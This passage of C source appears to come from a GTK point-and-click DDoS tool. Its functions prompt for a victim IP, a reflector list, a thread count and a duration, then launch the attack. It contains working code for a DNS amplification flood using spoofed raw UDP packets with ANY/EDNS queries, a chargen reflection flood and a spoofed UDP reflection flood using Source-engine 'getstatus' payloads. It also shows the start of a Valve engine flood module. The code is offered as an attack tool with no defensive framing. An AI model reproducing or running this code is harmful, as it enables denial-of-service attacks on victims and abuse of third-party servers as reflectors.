    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP> <target port> <reflection file> <threads> <time>", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    //g_free(text);

    IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    reflection_dialog = gtk_dialog_new_with_buttons("Enter Reflection File Name", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    throttle_dialog = gtk_dialog_new_with_buttons("Enter Threads Numbers", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);
    gtk_widget_set_size_request(port_dialog, 360, 100);
    gtk_widget_set_size_request(reflection_dialog, 360, 100);
    gtk_widget_set_size_request(throttle_dialog, 360, 100);
    gtk_widget_set_size_request(time_dialog, 360, 100);

    get_arg_entry_1 = gtk_entry_new();
    get_arg_entry_2 = gtk_entry_new();
    get_arg_entry_3 = gtk_entry_new();
    get_arg_entry_4 = gtk_entry_new();
    get_arg_entry_5 = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(port_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(reflection_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(throttle_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_1));
            gtk_widget_hide(IP_dialog);
            break;

        default:
            gtk_widget_hide(IP_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(port_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(port_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            port_number = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
            gtk_widget_hide(port_dialog);
            break;

        default:
            gtk_widget_hide(port_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(reflection_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(reflection_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            reflection = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
            gtk_widget_hide(reflection_dialog);
            break;

        default:
            gtk_widget_hide(reflection_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(throttle_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(throttle_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            throttle = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
            gtk_widget_hide(throttle_dialog);
            break;

        default:
            gtk_widget_hide(throttle_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(time_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
            gtk_widget_hide(time_dialog);
            break;

        default:
            gtk_widget_destroy(IP_dialog);
            gtk_widget_destroy(port_dialog);
            gtk_widget_destroy(reflection_dialog);
            gtk_widget_destroy(throttle_dialog);
            gtk_widget_destroy(time_dialog);
            return;
    }

    int i = 0;
    head = NULL;

    int max_len = 128;
    char *buffer = (char *) malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);

    int num_threads = atoi(throttle);

    FILE *list_fd = fopen(reflection,  "r");

    while (fgets(buffer, max_len, list_fd) != NULL)
    {
        if ((buffer[strlen(buffer) - 1] == '\n') || (buffer[strlen(buffer) - 1] == '\r'))
        {
            buffer[strlen(buffer) - 1] = 0x00;

            if(head == NULL)
            {
                head = (struct list *)malloc(sizeof(struct list));
                bzero(&head->data, sizeof(head->data));

                head->data.sin_addr.s_addr = inet_addr(buffer);
                head->next = head;
                head->prev = head;
            }

            else
            {
                struct list *new_node = (struct list *)malloc(sizeof(struct list));
                memset(new_node, 0x00, sizeof(struct list));

                new_node->data.sin_addr.s_addr = inet_addr(buffer);
                new_node->prev = head;
                new_node->next = head->next;
                head->next = new_node;
            }

            i++;
        }

        else
            continue;
    }

    struct list *current = head->next;
    pthread_t thread[num_threads];

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(port_number));
    sin.sin_addr.s_addr = inet_addr(IP);

    struct thread_data td[num_threads];

    for(i = 0; i < num_threads; i++)
    {
        td[i].thread_id = i;
        td[i].sin = sin;
        td[i].list_node = current;
        pthread_create(&thread[i], NULL, &flood_chargen, (void *)&td[i]);
    }

    wait_time_end(atof(time_duration));

    gtk_widget_destroy(IP_dialog);
    gtk_widget_destroy(port_dialog);
    gtk_widget_destroy(reflection_dialog);
    gtk_widget_destroy(throttle_dialog);
    gtk_widget_destroy(time_dialog);

    for(i = 0; i < num_threads; i++)
        pthread_cancel(thread[i]);

    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
    g_print("%s", text);
    g_free(text);

    return;
}

/** DNS AMPED **/

void cb_dns_amped_ddos(void)
{
    GtkWidget *IP_dialog = NULL;
    GtkWidget *port_dialog = NULL;
    GtkWidget *reflection_dialog = NULL;
    GtkWidget *throttle_dialog = NULL;
    GtkWidget *time_dialog = NULL;

    GtkWidget *get_arg_entry_1 = NULL;
    GtkWidget *get_arg_entry_2 = NULL;
    GtkWidget *get_arg_entry_3 = NULL;
    GtkWidget *get_arg_entry_4 = NULL;
    GtkWidget *get_arg_entry_5 = NULL;

    const gchar *IP = NULL;
    const gchar *port_number = NULL;
    const gchar *reflection = NULL;
    const gchar *throttle = NULL;
    const gchar *time_duration = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;


    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP/hostname> <port> <reflection file> <num threads> <time>", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    //g_free(text);

    IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    reflection_dialog = gtk_dialog_new_with_buttons("Enter Reflection File Name", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    throttle_dialog = gtk_dialog_new_with_buttons("Enter Threads Numbers", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);
    gtk_widget_set_size_request(port_dialog, 360, 100);
    gtk_widget_set_size_request(reflection_dialog, 360, 100);
    gtk_widget_set_size_request(throttle_dialog, 360, 100);
    gtk_widget_set_size_request(time_dialog, 360, 100);

    get_arg_entry_1 = gtk_entry_new();
    get_arg_entry_2 = gtk_entry_new();
    get_arg_entry_3 = gtk_entry_new();
    get_arg_entry_4 = gtk_entry_new();
    get_arg_entry_5 = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(port_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(reflection_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(throttle_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);

    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_1));
            gtk_widget_hide(IP_dialog);
            break;

        default:
            gtk_widget_hide(IP_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(port_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(port_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            port_number = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
            gtk_widget_hide(port_dialog);
            break;

        default:
            gtk_widget_hide(port_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(reflection_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(reflection_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            reflection = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
            gtk_widget_hide(reflection_dialog);
            break;

        default:
            gtk_widget_hide(reflection_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(throttle_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(throttle_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            throttle = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
            gtk_widget_hide(throttle_dialog);
            break;

        default:
            gtk_widget_hide(throttle_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(time_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
            gtk_widget_hide(time_dialog);
            break;

        default:
            gtk_widget_destroy(IP_dialog);
            gtk_widget_destroy(port_dialog);
            gtk_widget_destroy(reflection_dialog);
            gtk_widget_destroy(throttle_dialog);
            gtk_widget_destroy(time_dialog);
            return;
    }

    head = NULL;

    char *strLine = (char *) malloc(256);
    strLine = memset(strLine, 0x00, 256);

    //char strIP[32] = "";
    //char strDomain[256] = "";

    int iLine = 0;

    FILE *list_fd = fopen(reflection,  "r");
    while(fgets(strLine, 256, list_fd) != NULL)
    {
        ParseResolverLine(strLine, iLine);
        iLine++;
    }


    int i = 0;
    int num_threads = atoi(throttle);

    struct list *current = head->next;
    pthread_t thread[num_threads];
    struct sockaddr_in sin;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(0);
    sin.sin_addr.s_addr = inet_addr(IP);

    struct thread_data td[num_threads];

    int iPort = atoi(port_number);

    for(i = 0; i < num_threads; i++)
    {
        td[i].thread_id = i;
        td[i].sin= sin;
        td[i].list_node = current;
        td[i].port = iPort;
        pthread_create( &thread[i], NULL, &flood_dns, (void *) &td[i]);
    }

    wait_time_end(atoi(time_duration));

    gtk_widget_destroy(IP_dialog);
    gtk_widget_destroy(port_dialog);
    gtk_widget_destroy(reflection_dialog);
    gtk_widget_destroy(throttle_dialog);
    gtk_widget_destroy(time_dialog);

    for(i = 0; i < num_threads; i++)
        pthread_cancel(thread[i]);

    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
    g_print("%s", text);
    g_free(text);

    return;

}

void ChangetoDnsNameFormat(unsigned char* dns, unsigned char* host)
{
    size_t lock = 0;
    size_t i = 0;
    strcat((char*)host,".");

    for(i = 0 ; i < strlen((char*)host) ; i++)
    {
        if(host[i]=='.')
        {
            *dns++ = i-lock;

            for(;lock<i;lock++)
                *dns++=host[lock];

            lock++; //or lock=i+1;
        }
    }

    *dns++='\0';
}


uint32_t rand_cmwc_dns(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;

    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;

    if (x < c)
    {
        x++;
        c++;
    }

    return (Q[i] = r - x);
}


unsigned short csum_dns(unsigned short *buf, int nwords)
{
    unsigned long sum;

    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);

    return (unsigned short)(~sum);
}


void *flood_dns(void *par1)
{
    struct thread_data *td = (struct thread_data *)par1;

    char strPacket[MAX_PACKET_SIZE];
    int iPayloadSize = 0;

    struct sockaddr_in sin = td->sin;
    struct list *list_node = td->list_node;
    int iPort = td->port;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0)
    {
        fprintf(stderr, "Could not open raw socket. You need to be root!\n");
        exit(-1);
    }

    init_rand(time(NULL));

    memset(strPacket, 0, MAX_PACKET_SIZE);

    struct iphdr *iph = (struct iphdr *) &strPacket;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + 38;
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");   /**     A CHECKER  ***/

    iPayloadSize += sizeof(struct iphdr);


    struct udphdr *udph = (struct udphdr *) &strPacket[iPayloadSize];
    udph->source = htons(iPort);
    udph->dest = htons(53);
    udph->check = 0;

    iPayloadSize += sizeof(struct udphdr);

    struct DNS_HEADER *dns  = (struct DNS_HEADER *) &strPacket[iPayloadSize];
    dns->id = (unsigned short) htons(rand_cmwc_dns());
    dns->qr = 0;
    dns->opcode = 0;
    dns->aa = 0;
    dns->tc = 0;
    dns->rd = 1;
    dns->ra = 0;
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1);
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = htons(1);

    iPayloadSize += sizeof(struct DNS_HEADER);

    sin.sin_port = udph->source;
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum_dns((unsigned short *) strPacket, iph->tot_len >> 1);


    unsigned char strDomain[256];
    int i;
    int iAdditionalSize = 0;

    while(1)
    {
        list_node = list_node->next;

        memset(&strPacket[iPayloadSize + iAdditionalSize], 0, iAdditionalSize);

        iAdditionalSize = 0;

        unsigned char *qname = (unsigned char*) &strPacket[iPayloadSize + iAdditionalSize];

        strcpy((char*)strDomain, list_node->domain);
        ChangetoDnsNameFormat(qname, strDomain);

        iAdditionalSize += strlen(qname) + 1;

        struct QUESTION *qinfo = (struct QUESTION *) &strPacket[iPayloadSize + iAdditionalSize];
        qinfo->qtype = htons(255);
        qinfo->qclass = htons(1);

        iAdditionalSize += sizeof(struct QUESTION);

        void *edns = (void *) &strPacket[iPayloadSize + iAdditionalSize];
        memset(edns+2, 0x29, 1);
        memset(edns+3, 0x23, 1);
        memset(edns+4, 0x28, 1);


        iAdditionalSize += 11;

        iph->daddr = list_node->data.sin_addr.s_addr;

        udph->len= htons((iPayloadSize + iAdditionalSize + 5) - sizeof(struct iphdr));
        iph->tot_len = iPayloadSize + iAdditionalSize + 5;

        udph->source = htons(rand_cmwc() & 0xFFFF);
        iph->check = csum_dns((unsigned short *) strPacket, iph->tot_len >> 1);

        for(i = 0; i < PACKETS_PER_RESOLVER; i++)
            sendto(s, strPacket, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
    }
}


void ParseResolverLine(char *strLine, int iLine)
{
    char caIP[32] = "";
    char caDNS[512] = "";

    size_t i;
    //char buffer[512] = "";

    int moved = 0;

    for(i = 0; i < strlen(strLine); i++)
    {
        if(strLine[i] == ' ' || strLine[i] == '\n' || strLine[i] == '\t')
        {
            moved++;
            continue;
        }

        if(moved == 0)
            caIP[strlen(caIP)] = (char) strLine[i];

        else if(moved == 1)
            caDNS[strlen(caDNS)] = (char) strLine[i];
    }

    if(head == NULL)
    {
        head = (struct list *)malloc(sizeof(struct list));

        bzero(&head->data, sizeof(head->data));

        head->data.sin_addr.s_addr=inet_addr(caIP);
        head->data.sin_port=htons(53);
        strcpy(head->domain, caDNS);
        head->line = iLine;
        head->next = head;
        head->prev = head;
    }

    else
    {
        struct list *new_node = (struct list *)malloc(sizeof(struct list));

        memset(new_node, 0x00, sizeof(struct list));

        new_node->data.sin_addr.s_addr=inet_addr(caIP);
        new_node->data.sin_port=htons(53);
        strcpy(new_node->domain, caDNS);
        new_node->prev = head;
        head->line = iLine;
        new_node->next = head->next;
        head->next = new_node;
    }
}


void cb_udp_spoofed(void)
{
    GtkWidget *IP_dialog = NULL;
    GtkWidget *port_dialog = NULL;
    GtkWidget *ip_file_dialog = NULL;
    GtkWidget *time_dialog = NULL;
    GtkWidget *message_dialog = NULL;

    GtkWidget *get_arg_entry_1 = NULL;
    GtkWidget *get_arg_entry_2 = NULL;
    GtkWidget *get_arg_entry_3 = NULL;
    GtkWidget *get_arg_entry_4 = NULL;
    GtkWidget *get_arg_entry_5 = NULL;

    const gchar *IP = NULL;
    const gchar *port_number_spoof = NULL;
    const gchar *ip_file = NULL;
    const gchar *time_duration = NULL;
    const gchar *message = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;


    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Usage: <IP> <PORT> <ip_list.txt> <TIME> <MESSAGE>", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    //g_free(text);

    IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    ip_file_dialog = gtk_dialog_new_with_buttons("Enter IP File Name", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    message_dialog = gtk_dialog_new_with_buttons("Enter Your Message", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);
    gtk_widget_set_size_request(port_dialog, 360, 100);
    gtk_widget_set_size_request(ip_file_dialog, 360, 100);
    gtk_widget_set_size_request(time_dialog, 360, 100);
    gtk_widget_set_size_request(message_dialog, 360, 100);

    get_arg_entry_1 = gtk_entry_new();
    get_arg_entry_2 = gtk_entry_new();
    get_arg_entry_3 = gtk_entry_new();
    get_arg_entry_4 = gtk_entry_new();
    get_arg_entry_5 = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(port_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(ip_file_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(message_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);


    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_1));
            gtk_widget_hide(IP_dialog);
            break;

        default:
            gtk_widget_hide(IP_dialog);;
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(port_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(port_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            port_number_spoof = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
            gtk_widget_hide(port_dialog);
            break;

        default:
            gtk_widget_hide(port_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(ip_file_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(ip_file_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            ip_file = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
            gtk_widget_hide(ip_file_dialog);
            break;

        default:
            gtk_widget_hide(ip_file_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(time_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
            gtk_widget_hide(time_dialog);
            break;

        default:
            gtk_widget_hide(time_dialog);
            break;
    }

    gtk_widget_show_all(GTK_DIALOG(message_dialog)->vbox);
    switch(gtk_dialog_run(GTK_DIALOG(message_dialog)))
    {
        case GTK_RESPONSE_APPLY:
            message = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
            gtk_widget_hide(message_dialog);
            break;

        default:
            gtk_widget_destroy(IP_dialog);
            gtk_widget_destroy(port_dialog);
            gtk_widget_destroy(time_dialog);
            gtk_widget_destroy(message_dialog);
            return;
    }

    struct file_list *list = NULL;
	int list_size = 0;

	struct pthread_param param;
	pthread_t udp_attack;

	srand(time(0));

	FILE *pFile = fopen(ip_file, "r");
	if (pFile == NULL)
	{
		printf("[X] Cannot open file\n");
		return;
	}

	while (!feof(pFile))
	{
		char *line;
		line = getLine(pFile);

		char ip[1024];
		int port;

		if (sscanf(line, "%99[^:]:%99d", ip, &port) == 2)
		{
			list_size++;
			list = (struct file_list *) realloc(list, sizeof(struct file_list) * list_size);
			list[list_size - 1].ip = inet_addr(ip);
			list[list_size - 1].port = port;
        }

		free(line);
	}

	fclose(pFile);

	param.victim_ip = inet_addr(IP);
	param.victim_port = atoi(port_number_spoof);

	param.list = list;
	param.list_size = list_size;

	param.message = "\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10";

	pthread_create( &udp_attack, NULL, thread_attack, (void*) &param);

	wait_time_end(atoi(time_duration));

    pthread_cancel(udp_attack);

    gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
    g_print("%s", text);
    g_free(text);

	return;
}


void attack(unsigned long srcip, int srcport, unsigned long destip, int destport, const char *message)
{
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);

    char packet[4096];

    struct iphdr *iph = (struct iphdr *) packet;

	struct udphdr *udph = (struct udphdr *) (packet + sizeof(struct ip));

    struct sockaddr_in sin;
    //struct pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(destport);
    sin.sin_addr.s_addr = destip;

    memset (packet, 0, 4096);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 16;
    iph->tot_len = sizeof (struct ip) + sizeof (struct udphdr) + strlen(message);
    iph->id = htonl (54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = srcip;
    iph->daddr = sin.sin_addr.s_addr;

	udph->source = htons(srcport);
    udph->dest = htons(destport);
    udph->len = htons(sizeof(struct udphdr));
	udph->check = 0;

	strncpy((char *)udph + sizeof (struct udphdr),message, 4096 - (sizeof (struct udphdr) + sizeof (struct ip)));

	int one = 1;
	const int *val = &one;

	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
	{
		printf ("[x] Cannot set socket options (are we r00t?)\n");
		return;
	}

	if (sendto(s, packet, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		printf("[x] Error sending packet\n");

	close(s);
    return;
}


void *thread_attack(void *thread_params)
{
	struct pthread_param *params = thread_params;
	int i;

	while (1)
		for (i = 0; i < params->list_size; i++)
			attack(params->list[i]. ip, rand() % 65534 + 1, params->victim_ip, params->list[i].port, params->message);
}

char *getLine(FILE *f)
{
	char *buffer = malloc(sizeof(char));
	int pos = 0;
	char c_line;

	do
	{
        c_line = fgetc(f);
		if(c_line != EOF) buffer[pos++] = (char)c_line;
		buffer = (char*)realloc(buffer, sizeof(char) * (pos + 2));
	}while (c_line != EOF && c_line != '\n');

	return buffer;
}


/** VALVE SOURCE ENGINE DDOS **/
void cb_valve_engine_ddos(GtkButton *button, gpointer user_data)
{
    GtkWidget *IP_dialog = NULL;
    GtkWidget *Your_IP_dialog = NULL;
    //GtkWidget *port_dialog = NULL;
    //GtkWidget *throttle_dialog = NULL;
    //GtkWidget *packet_dialog = NULL;
    GtkWidget *threads_dialog = NULL;
    GtkWidget *time_dialog = NULL;

    GtkWidget *get_arg_entry_1 = NULL;
    GtkWidget *get_arg_entry_2 = NULL;
    GtkWidget *get_arg_entry_3 = NULL;
    GtkWidget *get_arg_entry_4 = NULL;
    //GtkWidget *get_arg_entry_5 = NULL;
    //GtkWidget *get_arg_entry_6 = NULL;

    const gchar *IP = NULL;
    //const gchar *Your_IP = NULL;
    //const gchar *throttle = NULL;
    //const gchar *packet = NULL;
    const gchar *number_threads = NULL;
    const gchar *time_duration = NULL;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;


    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));

    /** Set the default buffer text. **/
    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP> <Your IP > <threads number> <time>", -1);

    /** Obtain iters for the start and end of points of the buffer **/
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /** Get the entire buffer text. **/
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /** Print the text **/
    g_print("%s", text);

    //g_free(text);


    IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    Your_IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    threads_dialog = gtk_dialog_new_with_buttons("Enter Threads Number", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);

    gtk_widget_set_size_request(IP_dialog, 360, 100);
    gtk_widget_set_size_request(Your_IP_dialog, 360, 100);
    gtk_widget_set_size_request(threads_dialog, 360, 100);
    gtk_widget_set_size_request(time_dialog, 360, 100);

    get_arg_entry_1 = gtk_entry_new();
    get_arg_entry_2 = gtk_entry_new();
    get_arg_entry_3 = gtk_entry_new();
    get_arg_entry_4 = gtk_entry_new();

    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(Your_IP_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
